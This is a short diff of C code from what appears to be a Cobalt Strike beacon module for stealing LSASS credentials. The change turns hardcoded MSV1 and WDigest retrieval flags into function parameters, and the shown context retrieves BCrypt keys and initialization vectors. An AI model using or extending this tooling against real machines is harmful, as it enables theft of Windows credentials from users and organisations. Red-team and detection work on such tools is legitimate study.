@@ -140,7 +140,7 @@ unsigned char* RetrieveBCryptKey(HANDLE hFile, DWORD64 bCryptHandleKey, DWORD lo
     return TRUE;
 }
 
-BOOL StealLSASSCredentials(HANDLE hFile, char* pvWindowsVersion)
+BOOL StealLSASSCredentials(HANDLE hFile, char* pvWindowsVersion, BOOL RetrieveMSV1Credentials, BOOL RetrieveWDigestCredentials)
 {
     BeaconFormatPrintf(&outputbuffer, "[+] Stealing LSASS Credentials!\n");
 
@@ -211,8 +211,6 @@ BOOL StealLSASSCredentials(HANDLE hFile, char* pvWindowsVersion)
     PrintHex(InitializationVector, 8);
     BeaconFormatPrintf(&outputbuffer, "\n");
 
-    BOOL RetrieveMSV1Credentials = FALSE;
-    BOOL RetrieveWDigestCredentials = TRUE;
 
     if (RetrieveMSV1Credentials)
     {
